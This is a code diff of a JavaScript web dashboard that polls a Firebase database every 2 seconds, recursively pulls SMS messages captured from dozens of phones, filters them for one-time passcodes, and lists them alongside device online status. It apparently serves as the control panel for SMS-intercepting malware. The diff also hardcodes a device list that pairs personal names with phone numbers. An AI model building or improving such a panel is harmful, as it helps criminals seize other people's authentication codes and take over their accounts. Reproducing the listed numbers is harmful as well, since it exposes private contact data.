@@ -278,7 +278,7 @@
             <div class="empty-mailbox">✨ Waiting for OTPs...</div>
         </div>
         <div id="debugInfo" class="debug-info">
-            ⏱️ Last check: --:--:-- | Auto‑refresh every 10s
+            ⏱️ Last check: --:--:-- | Auto‑refresh every 2s
         </div>
     </div>
 </div>
@@ -304,12 +304,10 @@
     // Data structures
     let allReceivedOtps = [];
     let processedMsgIds = new Set();
-    let devices = [];
     let currentFilter = "all";
 
-    // ---------- MASTER NUMBER LIST (provided by user) ----------
-    // Format: index, name, sim1, sim2
-    const masterNumbers = [
+    // ---------- MASTER DEVICE LIST (exactly as provided) ----------
+    const masterDevices = [
         { name: "Redmi A2", sim1: null, sim2: "9401489517" },
         { name: "Sitaram's A05", sim1: "8357907306", sim2: "7879400281" },
         { name: "OnePlus Nord N20 SE", sim1: null, sim2: null },
@@ -391,13 +389,10 @@
         { name: "Anclucis's S25 Ultra", sim1: "8415098076", sim2: null }
     ];
 
-    // Build lookup by name
-    const numberMap = {};
-    masterNumbers.forEach(entry => {
-        numberMap[entry.name] = { sim1: entry.sim1, sim2: entry.sim2 };
-    });
+    // Build name-to-status map from Firebase (online/offline)
+    let statusMap = {}; // name -> status
 
-    // Helper: clean phone number (just in case we need to fallback to Firebase extraction)
+    // Helper: clean phone number (just in case we need fallback)
     function cleanPhoneNumber(simValue) {
         if (!simValue || typeof simValue !== 'string') return null;
         const digitsOnly = simValue.replace(/\D/g, '');
@@ -466,73 +461,92 @@
         }
     }
 
-    // Fetch Firebase branch
-    async function fetchFirebaseBranch() {
+    // Fetch Firebase data (all branches, recursively)
+    async function fetchAllFirebaseData() {
         const resp = await fetch(FIREBASE_URL);
         if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
-        const data = await resp.json();
-        for (const key in data) {
-            if (data[key] && data[key].All_User) return data[key];
-        }
-        for (const key in data) {
-            if (data[key] && typeof data[key] === 'object') {
-                for (const sub in data[key]) {
-                    if (data[key][sub] && data[key][sub].All_User) return data[key][sub];
+        return await resp.json();
+    }
+
+    // Extract all SMS messages from the entire Firebase structure
+    function extractAllSmsMessages(data) {
+        const messages = [];
+        // Recursively look for objects with "Sms" key
+        function traverse(obj, path = "") {
+            if (!obj || typeof obj !== 'object') return;
+            if (obj.Sms && typeof obj.Sms === 'object') {
+                // Found Sms node
+                for (const did in obj.Sms) {
+                    const deviceSms = obj.Sms[did];
+                    if (deviceSms && typeof deviceSms === 'object') {
+                        for (const msgId in deviceSms) {
+                            const msg = deviceSms[msgId];
+                            if (msg && msg.msg) {
+                                messages.push({
+                                    ...msg,
+                                    did: did
+                                });
+                            }
+                        }
+                    }
+                }
+            }
+            // Recurse deeper
+            for (const key in obj) {
+                if (obj[key] && typeof obj[key] === 'object') {
+                    traverse(obj[key], `${path}/${key}`);
                 }
             }
         }
-        throw new Error("No All_User branch found");
+        traverse(data);
+        return messages;
     }
 
-    // Fetch devices and merge with master number list
-    async function loadDevices() {
+    // Extract device status from Firebase (Info nodes)
+    function extractDeviceStatus(data) {
+        const status = {};
+        function traverse(obj) {
+            if (!obj || typeof obj !== 'object') return;
+            if (obj.Info && typeof obj.Info === 'object') {
+                for (const did in obj.Info) {
+                    const dev = obj.Info[did];
+                    if (dev && dev.Name) {
+                        status[dev.Name] = dev.status || "Offline";
+                    }
+                }
+            }
+            for (const key in obj) {
+                if (obj[key] && typeof obj[key] === 'object') {
+                    traverse(obj[key]);
+                }
+            }
+        }
+        traverse(data);
+        return status;
+    }
+
+    // Update status map from Firebase
+    async function updateStatusMap() {
         try {
-            const branch = await fetchFirebaseBranch();
-            const allUser = branch.All_User;
-            const info = allUser.Info || {};
-            const simInfo = allUser.SimINFO || {};
-
-            const deviceList = [];
-            for (const did in info) {
-                const dev = info[did];
-                const name = dev.Name || "Unknown";
-                const status = dev.status || "Offline";
-                // Get numbers from master list if available
-                let sim1 = null, sim2 = null;
-                if (numberMap[name]) {
-                    sim1 = numberMap[name].sim1;
-                    sim2 = numberMap[name].sim2;
-                } else {
-                    // Fallback to Firebase SimINFO
-                    const sim = simInfo[did] || {};
-                    sim1 = cleanPhoneNumber(sim.sim1);
-                    sim2 = cleanPhoneNumber(sim.sim2);
-                }
-                deviceList.push({
-                    did,
-                    name,
-                    status,
-                    sim1,
-                    sim2
-                });
-            }
-            // sort by name
-            deviceList.sort((a,b) => a.name.localeCompare(b.name));
-            devices = deviceList;
-            renderDeviceList();
+            const data = await fetchAllFirebaseData();
+            statusMap = extractDeviceStatus(data);
+            renderDeviceList(); // re-render when status updates
         } catch (err) {
-            console.error("Error loading devices:", err);
-            document.getElementById('deviceList').innerHTML = `<div class="empty-mailbox">⚠️ Failed to load devices</div>`;
+            console.error("Error fetching status:", err);
         }
     }
 
-    // Render device list based on current filter
+    // Render device list based on current filter (using masterDevices)
     function renderDeviceList() {
         const container = document.getElementById('deviceList');
-        let filtered = [];
-        if (currentFilter === "all") filtered = devices;
-        else if (currentFilter === "online") filtered = devices.filter(d => d.status === "Online");
-        else if (currentFilter === "offline") filtered = devices.filter(d => d.status !== "Online");
+        let filtered = [...masterDevices];
+        
+        if (currentFilter === "online") {
+            filtered = filtered.filter(dev => statusMap[dev.name] === "Online");
+        } else if (currentFilter === "offline") {
+            filtered = filtered.filter(dev => statusMap[dev.name] !== "Online");
+        }
+        // "all" keeps all
 
         if (filtered.length === 0) {
             container.innerHTML = `<div class="empty-mailbox">No devices found for this filter.</div>`;
@@ -541,12 +555,13 @@
 
         container.innerHTML = '';
         filtered.forEach((dev, idx) => {
+            const status = statusMap[dev.name] || "Offline";
             const card = document.createElement('div');
             card.className = 'device-card';
             card.innerHTML = `
                 <div class="device-name">
                     <span>${idx+1}. ${escapeHtml(dev.name)}</span>
-                    <span class="device-status ${dev.status === 'Online' ? 'status-online' : 'status-offline'}">${dev.status}</span>
+                    <span class="device-status ${status === 'Online' ? 'status-online' : 'status-offline'}">${status}</span>
                 </div>
                 <div class="sim-row">
                     <span>📱 SIM 1:</span>
@@ -621,55 +636,45 @@
         }
     }
 
-    // Poll for new OTPs
+    // Poll for new OTPs (every 2 seconds)
     let isPolling = false;
     let pollInterval = null;
 
-    async function checkForNewOtps(forceLog = false) {
+    async function checkForNewOtps() {
         if (isPolling) return;
         isPolling = true;
         try {
-            const branch = await fetchFirebaseBranch();
-            const allUser = branch.All_User;
-            const smsNode = allUser.Sms || {};
-            const info = allUser.Info || {};
-            const simInfo = allUser.SimINFO || {};
+            const data = await fetchAllFirebaseData();
+            const allMessages = extractAllSmsMessages(data);
+            
+            // Also update status map while we're at it
+            statusMap = extractDeviceStatus(data);
+            renderDeviceList();
 
             const newMessages = [];
-            for (const did in smsNode) {
-                const deviceSms = smsNode[did];
-                if (!deviceSms || typeof deviceSms !== 'object') continue;
-                const deviceName = info[did]?.Name || "Unknown";
-                let deviceNumber = null;
-                // Try master list first
-                if (numberMap[deviceName]) {
-                    deviceNumber = numberMap[deviceName].sim1 || numberMap[deviceName].sim2;
-                } else {
-                    const sim = simInfo[did] || {};
-                    const s1 = cleanPhoneNumber(sim.sim1);
-                    const s2 = cleanPhoneNumber(sim.sim2);
-                    deviceNumber = s1 || s2;
-                }
-
-                for (const msgId in deviceSms) {
-                    const msg = deviceSms[msgId];
-                    if (!msg || !msg.msg) continue;
-                    const uniqueKey = `${did}_${msgId}`;
-                    if (!processedMsgIds.has(uniqueKey) && isDesiredOtp(msg)) {
-                        processedMsgIds.add(uniqueKey);
-                        const otpObj = {
-                            text: msg.msg,
-                            timestamp: msg.date || Date.now(),
-                            timeFormatted: formatTime(msg.date || Date.now()),
-                            sender: msg.ph || "Unknown",
-                            deviceName: deviceName,
-                            deviceNumber: deviceNumber,
-                            did: did
-                        };
-                        newMessages.push(otpObj);
-                        allReceivedOtps.push(otpObj);
-                        console.log(`📩 New OTP: ${msg.msg.substring(0, 60)}`);
-                    }
+            for (const msg of allMessages) {
+                const uniqueKey = `${msg.did}_${msg.msgId || Math.random()}`; // we need a unique identifier
+                // Since messages may not have a fixed ID, we use a hash of the message content + timestamp as fallback
+                let msgKey = `${msg.did}_${msg.msg}_${msg.date}`;
+                if (msg.msgId) msgKey = `${msg.did}_${msg.msgId}`;
+                
+                if (!processedMsgIds.has(msgKey) && isDesiredOtp(msg)) {
+                    processedMsgIds.add(msgKey);
+                    // Find device number from master list
+                    const deviceInfo = masterDevices.find(d => d.name === (msg.deviceName || "Unknown"));
+                    const deviceNumber = deviceInfo ? (deviceInfo.sim1 || deviceInfo.sim2) : null;
+                    const otpObj = {
+                        text: msg.msg,
+                        timestamp: msg.date || Date.now(),
+                        timeFormatted: formatTime(msg.date || Date.now()),
+                        sender: msg.ph || "Unknown",
+                        deviceName: msg.deviceName || "Unknown",
+                        deviceNumber: deviceNumber,
+                        did: msg.did
+                    };
+                    newMessages.push(otpObj);
+                    allReceivedOtps.push(otpObj);
+                    console.log(`📩 New OTP: ${msg.msg.substring(0, 60)}`);
                 }
             }
 
@@ -677,7 +682,7 @@
                 persistOtps();
                 renderMailbox();
             }
-            document.getElementById('debugInfo').innerHTML = `⏱️ Last check: ${new Date().toLocaleTimeString()} | Auto‑refresh every 10s`;
+            document.getElementById('debugInfo').innerHTML = `⏱️ Last check: ${new Date().toLocaleTimeString()} | Auto‑refresh every 2s`;
         } catch (err) {
             console.error("Poll error:", err);
             document.getElementById('debugInfo').innerHTML = `⚠️ Error: ${err.message}`;
@@ -689,18 +694,13 @@
     // Mark existing messages as processed on first load
     async function markExistingAsProcessed() {
         try {
-            const branch = await fetchFirebaseBranch();
-            const allUser = branch.All_User;
-            const smsNode = allUser.Sms || {};
-            for (const did in smsNode) {
-                const deviceSms = smsNode[did];
-                if (deviceSms && typeof deviceSms === 'object') {
-                    for (const msgId in deviceSms) {
-                        const msg = deviceSms[msgId];
-                        if (msg && msg.msg && isDesiredOtp(msg)) {
-                            processedMsgIds.add(`${did}_${msgId}`);
-                        }
-                    }
+            const data = await fetchAllFirebaseData();
+            const allMessages = extractAllSmsMessages(data);
+            for (const msg of allMessages) {
+                if (isDesiredOtp(msg)) {
+                    let msgKey = `${msg.did}_${msg.msg}_${msg.date}`;
+                    if (msg.msgId) msgKey = `${msg.did}_${msg.msgId}`;
+                    processedMsgIds.add(msgKey);
                 }
             }
             persistOtps();
@@ -771,7 +771,7 @@
 
     // Manual refresh
     async function manualRefresh() {
-        await checkForNewOtps(true);
+        await checkForNewOtps();
     }
 
     // Set filter
@@ -787,7 +787,7 @@
     // Initialization
     async function init() {
         loadPersistedData();
-        await loadDevices();
+        await updateStatusMap();
         await markExistingAsProcessed();
         startPolling();
         attachEventListeners();
@@ -795,7 +795,7 @@
 
     function startPolling() {
         if (pollInterval) clearInterval(pollInterval);
-        pollInterval = setInterval(checkForNewOtps, 10000);
+        pollInterval = setInterval(checkForNewOtps, 2000); // 2 seconds
         setTimeout(checkForNewOtps, 500);
     }
 
